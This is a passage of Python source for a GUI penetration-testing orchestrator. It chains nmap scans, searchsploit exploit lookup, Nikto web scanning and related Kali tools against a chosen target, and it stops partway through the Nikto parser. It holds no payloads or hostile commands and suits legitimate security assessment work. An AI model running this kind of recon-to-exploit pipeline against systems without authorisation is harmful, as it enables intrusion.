#!/usr/bin/env python3
"""
Security Orchestrator - Cross-Platform GUI for Nmap, Searchsploit, Nikto, enum4linux, and w3af
A comprehensive reconnaissance and vulnerability analysis tool.

This is a single-file implementation combining all components for easy deployment on Kali Linux.
"""

import os
import sys
import platform
import subprocess
import shlex
import xml.etree.ElementTree as ET
import re
import threading
import queue
import time
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Callable
import logging
import logging.handlers
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import json

# =============================================================================
# CONFIGURATION AND UTILITIES
# =============================================================================

class Config:
    """Cross-platform configuration manager."""

    def __init__(self):
        self.os_name = platform.system().lower()
        self.is_windows = self.os_name == 'windows'
        self.is_linux = self.os_name == 'linux'

        # Default configuration
        self.config = {
            'app': {
                'name': 'Security Orchestrator',
                'version': '1.0.0',
                'window_width': 1200,
                'window_height': 800,
                'window_title': 'Security Orchestrator - Nmap, Searchsploit, Nikto, enum4linux & w3af Integration'
            },
            'paths': {
                'results_dir': 'results',
                'log_file': 'scan.log',
                'temp_dir': 'temp'
            },
            'tools': {
                'nmap': {
                    'executable': self._get_tool_executable('nmap'),
                    'timeout': 300,
                    'default_args': ['-v']
                },
                'searchsploit': {
                    'executable': self._get_tool_executable('searchsploit'),
                    'timeout': 60,
                    'default_args': []
                },
                'nikto': {
                    'executable': self._get_tool_executable('nikto'),
                    'timeout': 600,
                    'default_args': ['-Format', 'xml']
                },
                'enum4linux': {
                    'executable': self._get_tool_executable('enum4linux'),
                    'timeout': 300,
                    'default_args': ['-a']
                },
                'w3af_console': {
                    'executable': self._get_tool_executable('w3af_console'),
                    'timeout': 600,
                    'script_timeout': 300,
                    'default_args': []
                },
                'msfconsole': {
                    'executable': self._get_tool_executable('msfconsole'),
                    'timeout': 300,
                    'default_args': []
                }
            },
            'scanning': {
                'max_concurrent_tools': 3,
                'retry_attempts': 2,
                'default_http_ports': [80, 443, 8080, 8443, 8000, 8008, 8888, 9000],
                'http_services': ['http', 'https', 'http-proxy', 'https-proxy', 'ssl/http', 'http-alt']
            },
            'reporting': {
                'format': 'markdown',
                'include_raw_output': True,
                'max_output_length': 10000,
                'timestamp_format': '%Y-%m-%d %H:%M:%S'
            }
        }

    def _get_tool_executable(self, tool_name: str) -> str:
        """Get the platform-specific executable name for a tool."""
        if self.is_windows:
            for ext in ['.exe', '.bat', '.cmd', '']:
                executable = f"{tool_name}{ext}"
                if self._check_tool_availability(executable):
                    return executable
            return f"{tool_name}.exe"
        else:
            # For Linux/Kali, try multiple possible names and locations
            return self._get_linux_tool_executable(tool_name)

    def _get_linux_tool_executable(self, tool_name: str) -> str:
        """Get tool executable for Linux systems with fallback options."""
        # Define alternative names for tools
        tool_alternatives = {
            'searchsploit': ['searchsploit'],
            'enum4linux': ['enum4linux', 'enum4linux-ng'],
            'w3af_console': ['w3af_console', 'w3af'],
            'nmap': ['nmap'],
            'nikto': ['nikto']
        }

        alternatives = tool_alternatives.get(tool_name, [tool_name])

        # Common installation paths on Kali Linux
        search_paths = [
            '/usr/bin',
            '/usr/local/bin',
            '/usr/sbin',
            '/sbin',
            '/opt',
            '/usr/share',
            '/usr/local/share'
        ]

        # First try PATH
        for alt_name in alternatives:
            if self._check_tool_availability(alt_name):
                return alt_name

        # Then try common installation directories
        for path in search_paths:
            for alt_name in alternatives:
                full_path = Path(path) / alt_name
                if full_path.exists() and full_path.is_file():
                    # Check if executable
                    try:
                        import stat
                        if full_path.stat().st_mode & stat.S_IXUSR:
                            return str(full_path)
                    except:
                        pass

        # Return the primary name as fallback
        return alternatives[0]

    def _check_tool_availability(self, executable: str) -> bool:
        """Check if a tool executable is available in PATH or by full path."""
        import shutil

        # First check if it's a full path
        if Path(executable).exists():
            return True

        # Then check PATH
        return shutil.which(executable) is not None

    def get(self, key_path: str, default: Any = None) -> Any:
        """Get configuration value using dot notation."""
        keys = key_path.split('.')
        value = self.config

        for key in keys:
            if isinstance(value, dict) and key in value:
                value = value[key]
            else:
                return default

        return value

    def set(self, key_path: str, value: Any) -> None:
        """Set configuration value using dot notation."""
        keys = key_path.split('.')
        config_ref = self.config

        for key in keys[:-1]:
            if key not in config_ref:
                config_ref[key] = {}
            config_ref = config_ref[key]

        config_ref[keys[-1]] = value

    def get_results_dir(self, base_dir: Optional[str] = None) -> Path:
        """Get the results directory path."""
        if base_dir:
            results_path = Path(base_dir) / self.get('paths.results_dir')
        else:
            results_path = Path.cwd() / self.get('paths.results_dir')

        results_path.mkdir(parents=True, exist_ok=True)
        return results_path

    def get_log_file_path(self, results_dir: Optional[Path] = None) -> Path:
        """Get the log file path."""
        if not results_dir:
            results_dir = self.get_results_dir()

        return results_dir / self.get('paths.log_file')

    def is_tool_available(self, tool_name: str) -> bool:
        """Check if a security tool is available on the system."""
        executable = self.get(f'tools.{tool_name}.executable')
        if not executable:
            return False

        return self._check_tool_availability(executable)

    def get_available_tools(self) -> list:
        """Get list of available security tools."""
        available = []
        for tool_name in self.config['tools'].keys():
            if self.is_tool_available(tool_name):
                available.append(tool_name)

        return available

    def get_tool_command(self, tool_name: str, additional_args: Optional[list] = None) -> list:
        """Get full command array for a tool."""
        executable = self.get(f'tools.{tool_name}.executable')
        default_args = self.get(f'tools.{tool_name}.default_args', [])

        if not executable:
            raise ValueError(f"Tool {tool_name} not configured")

        command = [executable] + default_args

        if additional_args:
            command.extend(additional_args)

        return command

# Global configuration instance
config = Config()

class SecurityOrchestratorLogger:
    """Enhanced logger with cross-platform support and structured output."""

    def __init__(self,
                 name: str = "SecurityOrchestrator",
                 log_file: Optional[str] = None,
                 console_level: int = logging.INFO,
                 file_level: int = logging.DEBUG):
        self.name = name
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)

        if self.logger.handlers:
            self.logger.handlers.clear()

        if not log_file:
            results_dir = config.get_results_dir()
            log_file = str(config.get_log_file_path(results_dir))

        self.log_file = Path(log_file)
        self.log_file.parent.mkdir(parents=True, exist_ok=True)

        detailed_formatter = logging.Formatter(
            '%(asctime)s | %(name)s | %(levelname)-8s | %(funcName)s:%(lineno)d | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

        simple_formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%H:%M:%S'
        )

        try:
            file_handler = logging.handlers.RotatingFileHandler(
                self.log_file,
                maxBytes=10 * 1024 * 1024,
                backupCount=5,
                encoding='utf-8'
            )
            file_handler.setLevel(file_level)
            file_handler.setFormatter(detailed_formatter)
            self.logger.addHandler(file_handler)
        except Exception as e:
            print(f"Warning: Could not setup file logging: {e}")

        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(console_level)
        console_handler.setFormatter(simple_formatter)
        self.logger.addHandler(console_handler)

        self.scan_start_time = None
        self.current_step = None

    def start_scan_session(self, target: str, nmap_command: str):
        """Mark the start of a new scan session."""
        self.scan_start_time = datetime.now()
        self.info("=" * 80)
        self.info("SCAN SESSION STARTED")
        self.info(f"Target: {target}")
        self.info(f"Nmap Command: {nmap_command}")
        self.info(f"Start Time: {self.scan_start_time}")
        self.info("=" * 80)

    def end_scan_session(self):
        """Mark the end of a scan session."""
        if self.scan_start_time:
            duration = datetime.now() - self.scan_start_time
            self.info("=" * 80)
            self.info("SCAN SESSION COMPLETED")
            self.info(f"Duration: {duration}")
            self.info("=" * 80)

    def start_tool_step(self, tool_name: str, description: str = ""):
        """Log the start of a tool execution step."""
        self.current_step = tool_name
        self.info(f"🚀 Starting {tool_name.upper()}" + (f": {description}" if description else ""))

    def end_tool_step(self, tool_name: str, success: bool = True, message: str = ""):
        """Log the end of a tool execution step."""
        status = "✅ SUCCESS" if success else "❌ FAILED"
        self.info(f"{status} {tool_name.upper()}" + (f": {message}" if message else ""))
        if tool_name == self.current_step:
            self.current_step = None

    def log_tool_output(self, tool_name: str, output: str, is_error: bool = False):
        """Log tool output with appropriate formatting."""
        level = self.error if is_error else self.debug
        output_type = "STDERR" if is_error else "STDOUT"

        max_length = 2000
        if len(output) > max_length:
            truncated = output[:max_length] + f"\n... [TRUNCATED - {len(output)} total chars]"
            level(f"{tool_name} {output_type}:\n{truncated}")
        else:
            level(f"{tool_name} {output_type}:\n{output}")

    def log_command_execution(self, command: list, cwd: Optional[str] = None):
        """Log command execution details."""
        cmd_str = ' '.join(f'"{arg}"' if ' ' in arg else arg for arg in command)
        self.debug(f"Executing command: {cmd_str}")
        if cwd:
            self.debug(f"Working directory: {cwd}")

    def log_xml_parsing(self, file_path: str, success: bool, details: str = ""):
        """Log XML parsing operations."""
        if success:
            self.debug(f"Successfully parsed XML: {file_path}" + (f" - {details}" if details else ""))
        else:
            self.error(f"Failed to parse XML: {file_path}" + (f" - {details}" if details else ""))

    def log_tool_availability(self, tool_name: str, available: bool, path: Optional[str] = None):
        """Log tool availability check results."""
        if available:
            self.info(f"✓ {tool_name} is available" + (f" at {path}" if path else ""))
        else:
            self.warning(f"✗ {tool_name} is not available - will skip this tool")

    def debug(self, message: Any):
        self.logger.debug(str(message))

    def info(self, message: Any):
        self.logger.info(str(message))

    def warning(self, message: Any):
        self.logger.warning(str(message))

    def error(self, message: Any):
        self.logger.error(str(message))

    def critical(self, message: Any):
        self.logger.critical(str(message))

    def exception(self, message: Any):
        self.logger.exception(str(message))

# Global logger instance
logger = SecurityOrchestratorLogger()

# =============================================================================
# DATA MODELS
# =============================================================================

class ScanResults:
    """Data model for storing scan results from all tools."""

    def __init__(self):
        self.nmap_results = {}
        self.searchsploit_results = {}
        self.nikto_results = {}
        self.enum4linux_results = {}
        self.w3af_results = {}
        self.metadata = {
            'scan_start_time': None,
            'scan_end_time': None,
            'target_ip': None,
            'nmap_command': None,
            'tools_used': []
        }

    def set_metadata(self, key: str, value: Any):
        """Set metadata value."""
        self.metadata[key] = value

    def get_metadata(self, key: str, default: Any = None) -> Any:
        """Get metadata value."""
        return self.metadata.get(key, default)

    def add_tool_result(self, tool_name: str, result: Dict[str, Any]):
        """Add results from a specific tool."""
        if tool_name == 'nmap':
            self.nmap_results = result
        elif tool_name == 'searchsploit':
            self.searchsploit_results = result
        elif tool_name == 'nikto':
            self.nikto_results = result
        elif tool_name == 'enum4linux':
            self.enum4linux_results = result
        elif tool_name == 'w3af':
            self.w3af_results = result

    def get_tool_result(self, tool_name: str) -> Dict[str, Any]:
        """Get results from a specific tool."""
        if tool_name == 'nmap':
            return self.nmap_results
        elif tool_name == 'searchsploit':
            return self.searchsploit_results
        elif tool_name == 'nikto':
            return self.nikto_results
        elif tool_name == 'enum4linux':
            return self.enum4linux_results
        elif tool_name == 'w3af':
            return self.w3af_results
        return {}

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            'metadata': self.metadata,
            'nmap_results': self.nmap_results,
            'searchsploit_results': self.searchsploit_results,
            'nikto_results': self.nikto_results,
            'enum4linux_results': self.enum4linux_results,
            'w3af_results': self.w3af_results
        }

class AttackPath:
    """Data model for representing attack paths and recommendations."""

    def __init__(self):
        self.target_info = {}
        self.vulnerabilities = []
        self.attack_vectors = []
        self.recommendations = []
        self.risk_assessment = {}

    def add_vulnerability(self, vuln: Dict[str, Any]):
        """Add a vulnerability to the attack path."""
        self.vulnerabilities.append(vuln)

    def add_attack_vector(self, vector: Dict[str, Any]):
        """Add an attack vector."""
        self.attack_vectors.append(vector)

    def add_recommendation(self, recommendation: str, priority: str = 'medium'):
        """Add a security recommendation."""
        self.recommendations.append({
            'text': recommendation,
            'priority': priority,
            'timestamp': datetime.now().isoformat()
        })

    def set_risk_assessment(self, assessment: Dict[str, Any]):
        """Set overall risk assessment."""
        self.risk_assessment = assessment

    def get_high_priority_vulns(self) -> List[Dict[str, Any]]:
        """Get high-priority vulnerabilities."""
        return [v for v in self.vulnerabilities if v.get('severity', '').lower() in ['high', 'critical']]

    def get_attack_surface(self) -> Dict[str, Any]:
        """Get attack surface summary."""
        return {
            'total_vulnerabilities': len(self.vulnerabilities),
            'high_severity': len(self.get_high_priority_vulns()),
            'attack_vectors': len(self.attack_vectors),
            'services_exposed': len(set(v.get('service', '') for v in self.vulnerabilities if v.get('service')))
        }

# =============================================================================
# TOOL WRAPPERS
# =============================================================================

class NmapWrapper:
    """Nmap scanner wrapper with XML output parsing."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.xml_output_file = self.results_dir / "nmap_result.xml"
        self.timeout = config.get('tools.nmap.timeout', 300)

    def check_availability(self) -> bool:
        """Check if nmap is available on the system."""
        try:
            executable = config.get('tools.nmap.executable')
            result = subprocess.run([executable, '--version'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('nmap', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('nmap', False)
            logger.debug(f"Nmap availability check failed: {e}")
            return False

    def parse_nmap_command(self, nmap_command: str, target_ip: Optional[str] = None) -> List[str]:
        """Parse and modify nmap command to ensure XML output."""
        try:
            if config.is_windows:
                parts = []
                current = ""
                in_quotes = False

                for char in nmap_command:
                    if char == '"':
                        in_quotes = not in_quotes
                    elif char == ' ' and not in_quotes:
                        if current:
                            parts.append(current)
                            current = ""
                    else:
                        current += char

                if current:
                    parts.append(current)
            else:
                parts = shlex.split(nmap_command)

            if parts and parts[0].lower().endswith('nmap'):
                parts = parts[1:]

            xml_args = ['-oX', str(self.xml_output_file)]

            filtered_parts = []
            skip_next = False

            for i, part in enumerate(parts):
                if skip_next:
                    skip_next = False
                    continue

                if part == '-oX':
                    skip_next = True
                    continue
                elif part.startswith('-oX'):
                    continue
                else:
                    filtered_parts.append(part)

            has_target = any(self._looks_like_target(part) for part in filtered_parts)

            if not has_target and target_ip:
                filtered_parts.append(target_ip)
                logger.info(f"Added fallback target: {target_ip}")

            executable = config.get('tools.nmap.executable')
            final_command = [executable] + filtered_parts + xml_args

            logger.debug(f"Parsed nmap command: {' '.join(final_command)}")
            return final_command

        except Exception as e:
            logger.error(f"Error parsing nmap command: {e}")
            raise ValueError(f"Invalid nmap command: {e}")

    def _looks_like_target(self, arg: str) -> bool:
        """Check if an argument looks like an IP address or hostname."""
        patterns = [
            r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',
            r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$',
            r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}$',
            r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
        ]

        return any(re.match(pattern, arg) for pattern in patterns)

    def run_scan(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute nmap scan with XML output."""
        try:
            logger.start_tool_step('nmap', f'Executing: {nmap_command}')

            command = self.parse_nmap_command(nmap_command, target_ip)

            self.results_dir.mkdir(parents=True, exist_ok=True)

            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            if stdout.strip():
                logger.log_tool_output('nmap', stdout, False)
            if stderr.strip():
                logger.log_tool_output('nmap', stderr, True)

            if process.returncode == 0 and self.xml_output_file.exists():
                logger.end_tool_step('nmap', True, f"XML output saved to {self.xml_output_file}")
                return True, f"Nmap scan completed successfully. XML output: {self.xml_output_file}"
            else:
                error_msg = f"Nmap failed (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                logger.end_tool_step('nmap', False, error_msg)
                return False, error_msg

        except subprocess.TimeoutExpired:
            error_msg = f"Nmap scan timed out after {self.timeout} seconds"
            logger.end_tool_step('nmap', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"Nmap execution error: {str(e)}"
            logger.end_tool_step('nmap', False, error_msg)
            return False, error_msg

    def parse_xml_results(self) -> Optional[Dict[str, Any]]:
        """Parse nmap XML output and extract key information."""
        if not self.xml_output_file.exists():
            logger.error(f"Nmap XML file not found: {self.xml_output_file}")
            return None

        try:
            logger.debug(f"Parsing nmap XML: {self.xml_output_file}")
            tree = ET.parse(self.xml_output_file)
            root = tree.getroot()

            results = {
                'scan_info': {},
                'hosts': [],
                'summary': {}
            }

            scaninfo = root.find('scaninfo')
            if scaninfo is not None:
                results['scan_info'] = {
                    'type': scaninfo.get('type', ''),
                    'protocol': scaninfo.get('protocol', ''),
                    'numservices': scaninfo.get('numservices', ''),
                    'services': scaninfo.get('services', '')
                }

            for host in root.findall('host'):
                host_info = self._parse_host(host)
                if host_info:
                    results['hosts'].append(host_info)

            runstats = root.find('runstats')
            if runstats is not None:
                finished = runstats.find('finished')
                if finished is not None:
                    results['summary'] = {
                        'elapsed': finished.get('elapsed', ''),
                        'exit': finished.get('exit', ''),
                        'summary': finished.get('summary', '')
                    }

            logger.log_xml_parsing(str(self.xml_output_file), True, f"Found {len(results['hosts'])} hosts")
            return results

        except Exception as e:
            logger.log_xml_parsing(str(self.xml_output_file), False, str(e))
            return None

    def _parse_host(self, host_element) -> Optional[Dict[str, Any]]:
        """Parse individual host element from XML."""
        try:
            host_info = {
                'addresses': [],
                'hostnames': [],
                'ports': [],
                'os': {},
                'status': {}
            }

            for address in host_element.findall('address'):
                host_info['addresses'].append({
                    'addr': address.get('addr', ''),
                    'addrtype': address.get('addrtype', '')
                })

            hostnames_elem = host_element.find('hostnames')
            if hostnames_elem is not None:
                for hostname in hostnames_elem.findall('hostname'):
                    host_info['hostnames'].append({
                        'name': hostname.get('name', ''),
                        'type': hostname.get('type', '')
                    })

            status = host_element.find('status')
            if status is not None:
                host_info['status'] = {
                    'state': status.get('state', ''),
                    'reason': status.get('reason', '')
                }

            ports = host_element.find('ports')
            if ports is not None:
                for port in ports.findall('port'):
                    port_info = self._parse_port(port)
                    if port_info:
                        host_info['ports'].append(port_info)

            os_elem = host_element.find('os')
            if os_elem is not None:
                host_info['os'] = self._parse_os(os_elem)

            return host_info

        except Exception as e:
            logger.debug(f"Error parsing host element: {e}")
            return None

    def _parse_port(self, port_element) -> Optional[Dict[str, Any]]:
        """Parse individual port element from XML."""
        try:
            port_info = {
                'portid': port_element.get('portid', ''),
                'protocol': port_element.get('protocol', ''),
                'state': {},
                'service': {}
            }

            state = port_element.find('state')
            if state is not None:
                port_info['state'] = {
                    'state': state.get('state', ''),
                    'reason': state.get('reason', ''),
                    'reason_ttl': state.get('reason_ttl', '')
                }

            service = port_element.find('service')
            if service is not None:
                port_info['service'] = {
                    'name': service.get('name', ''),
                    'product': service.get('product', ''),
                    'version': service.get('version', ''),
                    'extrainfo': service.get('extrainfo', ''),
                    'method': service.get('method', ''),
                    'conf': service.get('conf', '')
                }

            return port_info

        except Exception as e:
            logger.debug(f"Error parsing port element: {e}")
            return None

    def _parse_os(self, os_element) -> Dict[str, Any]:
        """Parse OS detection element from XML."""
        os_info = {
            'matches': [],
            'classes': []
        }

        try:
            for osmatch in os_element.findall('osmatch'):
                os_info['matches'].append({
                    'name': osmatch.get('name', ''),
                    'accuracy': osmatch.get('accuracy', ''),
                    'line': osmatch.get('line', '')
                })

            for osclass in os_element.findall('osclass'):
                os_info['classes'].append({
                    'type': osclass.get('type', ''),
                    'vendor': osclass.get('vendor', ''),
                    'osfamily': osclass.get('osfamily', ''),
                    'osgen': osclass.get('osgen', ''),
                    'accuracy': osclass.get('accuracy', '')
                })

        except Exception as e:
            logger.debug(f"Error parsing OS element: {e}")

        return os_info

    def get_target_ip(self) -> Optional[str]:
        """Extract target IP from XML results."""
        results = self.parse_xml_results()
        if results and results['hosts']:
            for address in results['hosts'][0]['addresses']:
                if address['addrtype'] == 'ipv4':
                    return address['addr']
        return None

    def get_http_ports(self) -> List[Dict[str, Any]]:
        """Extract HTTP/HTTPS ports from scan results."""
        http_ports = []
        results = self.parse_xml_results()

        if not results:
            return http_ports

        http_services = config.get('scanning.http_services', [])
        default_http_ports = config.get('scanning.default_http_ports', [])

        for host in results['hosts']:
            target_ip = None
            for addr in host['addresses']:
                if addr['addrtype'] == 'ipv4':
                    target_ip = addr['addr']
                    break

            if not target_ip:
                continue

            for port in host['ports']:
                port_num = int(port['portid'])
                service_name = port['service'].get('name', '').lower()

                is_http = (
                    port_num in default_http_ports or
                    any(http_svc in service_name for http_svc in http_services) or
                    'ssl' in service_name and port_num in [443, 8443]
                )

                if is_http and port['state']['state'] == 'open':
                    is_https = (
                        port_num in [443, 8443] or
                        'https' in service_name or
                        'ssl' in service_name
                    )

                    http_ports.append({
                        'ip': target_ip,
                        'port': port_num,
                        'protocol': 'https' if is_https else 'http',
                        'service': port['service'],
                        'url': f"{'https' if is_https else 'http'}://{target_ip}:{port_num}"
                    })

        logger.debug(f"Found {len(http_ports)} HTTP/HTTPS ports: {[p['url'] for p in http_ports]}")
        return http_ports

class SearchsploitWrapper:
    """Searchsploit wrapper for exploit database searches."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.output_file = self.results_dir / "searchsploit.txt"
        self.timeout = config.get('tools.searchsploit.timeout', 60)

    def check_availability(self) -> bool:
        """Check if searchsploit is available on the system."""
        try:
            executable = config.get('tools.searchsploit.executable')
            result = subprocess.run([executable, '--help'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('searchsploit', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('searchsploit', False)
            logger.debug(f"Searchsploit availability check failed: {e}")
            return False

    def run_nmap_search(self, nmap_xml_file: Path) -> Tuple[bool, str]:
        """Run searchsploit against nmap XML output."""
        try:
            logger.start_tool_step('searchsploit', f'Analyzing nmap XML: {nmap_xml_file}')

            if not nmap_xml_file.exists():
                error_msg = f"Nmap XML file not found: {nmap_xml_file}"
                logger.end_tool_step('searchsploit', False, error_msg)
                return False, error_msg

            executable = config.get('tools.searchsploit.executable')
            command = [executable, '--nmap', str(nmap_xml_file), '-x']

            self.results_dir.mkdir(parents=True, exist_ok=True)

            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("SEARCHSPLOIT ANALYSIS RESULTS\n")
                f.write("=" * 50 + "\n\n")
                f.write("COMMAND EXECUTED:\n")
                f.write(f"{' '.join(command)}\n\n")
                f.write("STDOUT OUTPUT:\n")
                f.write(stdout)
                if stderr.strip():
                    f.write("\n\nSTDERR OUTPUT:\n")
                    f.write(stderr)

            if stdout.strip():
                logger.log_tool_output('searchsploit', stdout, False)
            if stderr.strip():
                logger.log_tool_output('searchsploit', stderr, True)

            if process.returncode == 0:
                logger.end_tool_step('searchsploit', True, f"Results saved to {self.output_file}")
                return True, stdout
            else:
                error_msg = f"Searchsploit failed (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                logger.end_tool_step('searchsploit', False, error_msg)
                return False, error_msg

        except subprocess.TimeoutExpired:
            error_msg = f"Searchsploit timed out after {self.timeout} seconds"
            logger.end_tool_step('searchsploit', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"Searchsploit execution error: {str(e)}"
            logger.end_tool_step('searchsploit', False, error_msg)
            return False, error_msg

    def parse_results(self, output: Optional[str] = None) -> Dict[str, Any]:
        """Parse searchsploit output and extract exploit information."""
        if output is None:
            if not self.output_file.exists():
                logger.error(f"Searchsploit output file not found: {self.output_file}")
                return {'exploits': [], 'summary': {}}

            try:
                with open(self.output_file, 'r', encoding='utf-8') as f:
                    output = f.read()
            except Exception as e:
                logger.error(f"Error reading searchsploit output: {e}")
                return {'exploits': [], 'summary': {}}

        results = {
            'exploits': [],
            'summary': {
                'total_found': 0,
                'by_service': {},
                'by_platform': {}
            }
        }

        try:
            lines = output.split('\n')

            for line in lines:
                line = line.strip()
                if not line:
                    continue

                match = re.match(r'(\d+)\s+\|\s+([^|]+?)\s+\|\s+([^|]+?)\s+\|\s+(.+)', line)
                if match:
                    exploit_id = match.group(1).strip()
                    title = match.group(2).strip()
                    platform = match.group(3).strip()
                    path = match.group(4).strip()

                    exploit_info = {
                        'id': exploit_id,
                        'title': title,
                        'platform': platform,
                        'path': path,
                        'local_file': self._find_local_file(path)
                    }

                    results['exploits'].append(exploit_info)

                    results['summary']['total_found'] += 1

                    if platform in results['summary']['by_platform']:
                        results['summary']['by_platform'][platform] += 1
                    else:
                        results['summary']['by_platform'][platform] = 1

            self._extract_service_mappings(output, results)

            logger.debug(f"Parsed {len(results['exploits'])} exploits from searchsploit output")
            return results

        except Exception as e:
            logger.error(f"Error parsing searchsploit results: {e}")
            return {'exploits': [], 'summary': {}}

    def _find_local_file(self, path: str) -> Optional[str]:
        """Try to find the local exploit file path."""
        try:
            common_paths = [
                '/usr/share/exploitdb',
                '/opt/exploitdb',
                'C:\\exploitdb',
                str(Path.home() / 'exploitdb')
            ]

            for base_path in common_paths:
                full_path = Path(base_path) / path
                if full_path.exists():
                    return str(full_path)

            return None
        except Exception:
            return None

    def _extract_service_mappings(self, output: str, results: Dict[str, Any]) -> None:
        """Extract service-to-exploit mappings from output."""
        try:
            service_exploits = {}

            for line in output.split('\n'):
                line = line.strip().lower()

                for pattern in [r'(\w+)\s+([\d\.]+)', r'(\w+/[\d\.]+)', r'port\s+(\d+)/(\w+)']:
                    matches = re.findall(pattern, line)
                    for match in matches:
                        service = match[0] if isinstance(match, tuple) else match
                        if service not in service_exploits:
                            service_exploits[service] = 0
                        service_exploits[service] += 1

            results['summary']['by_service'] = service_exploits

        except Exception as e:
            logger.debug(f"Error extracting service mappings: {e}")

class NiktoWrapper:
    """Nikto wrapper for web vulnerability scanning."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.timeout = config.get('tools.nikto.timeout', 600)
        self.scan_results = []

    def check_availability(self) -> bool:
        """Check if nikto is available on the system."""
        try:
            executable = config.get('tools.nikto.executable')
            result = subprocess.run([executable, '--help'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('nikto', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('nikto', False)
            logger.debug(f"Nikto availability check failed: {e}")
            return False

    def scan_http_services(self, http_ports: List[Dict[str, Any]]) -> Tuple[bool, str]:
        """Scan multiple HTTP/HTTPS services with Nikto."""
        if not http_ports:
            logger.info("No HTTP/HTTPS ports found for Nikto scanning")
            return True, "No HTTP/HTTPS services to scan"

        logger.start_tool_step('nikto', f'Scanning {len(http_ports)} HTTP/HTTPS services')

        self.scan_results = []
        successful_scans = 0
        failed_scans = 0

        self.results_dir.mkdir(parents=True, exist_ok=True)

        for http_service in http_ports:
            url = http_service['url']
            port = http_service['port']
            ip = http_service['ip']

            success, message = self._scan_single_service(url, ip, port)

            if success:
                successful_scans += 1
            else:
                failed_scans += 1
                logger.error(f"Nikto scan failed for {url}: {message}")

        self._create_summary_file()

        overall_success = successful_scans > 0
        summary_message = f"Nikto completed: {successful_scans} successful, {failed_scans} failed"

        logger.end_tool_step('nikto', overall_success, summary_message)
        return overall_success, summary_message

    def _scan_single_service(self, url: str, ip: str, port: int) -> Tuple[bool, str]:
        """Scan a single HTTP/HTTPS service with Nikto."""
        try:
            xml_output_file = self.results_dir / f"nikto_{ip}_{port}.xml"

            executable = config.get('tools.nikto.executable')
            command = [
                executable,
                '-h', url,
                '-Format', 'xml',
                '-output', str(xml_output_file)
            ]

            logger.debug(f"Scanning {url} with Nikto")
            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            if stdout.strip():
                logger.log_tool_output('nikto', stdout, False)
            if stderr.strip() and 'error' in stderr.lower():
                logger.log_tool_output('nikto', stderr, True)

            if xml_output_file.exists():
                scan_result = self._parse_nikto_xml(xml_output_file, url, ip, port)
                if scan_result:
                    self.scan_results.append(scan_result)
                    logger.debug(f"Nikto scan completed for {url}")
                    return True, f"Scan completed, XML saved to {xml_output_file}"
                else:
                    return False, "Failed to parse Nikto XML output"
            else:
                error_msg = f"Nikto XML output not created (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                return False, error_msg

        except subprocess.TimeoutExpired:
            return False, f"Nikto scan timed out after {self.timeout} seconds"
        except Exception as e:
            return False, f"Nikto execution error: {str(e)}"

    def _parse_nikto_xml(self, xml_file: Path, url: str, ip: str, port: int) -> Optional[Dict[str, Any]]:
        """Parse Nikto XML output file."""
        try:
            logger.debug(f"Parsing Nikto XML: {xml_file}")

            with open(xml_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            content = self._clean_nikto_xml(content)

            root = ET.fromstring(content)

            scan_result = {
                'url': url,
                'ip': ip,
                'port': port,
                'scan_details': {},
                'vulnerabilities': [],
                'statistics': {}
            }

            scandetails = root.find('.//scandetails')
            if scandetails is not None:
                scan_result['scan_details'] = {
                    'targetip': scandetails.get('targetip', ip),
                    'targethostname': scandetails.get('targethostname', ''),
                    'targetport': scandetails.get('targetport', str(port)),
                    'targetbanner': scandetails.get('targetbanner', ''),
                    'starttime': scandetails.get('starttime', ''),
                    'sitename': scandetails.get('sitename', url)
                }

            for item in root.findall('.//item'):
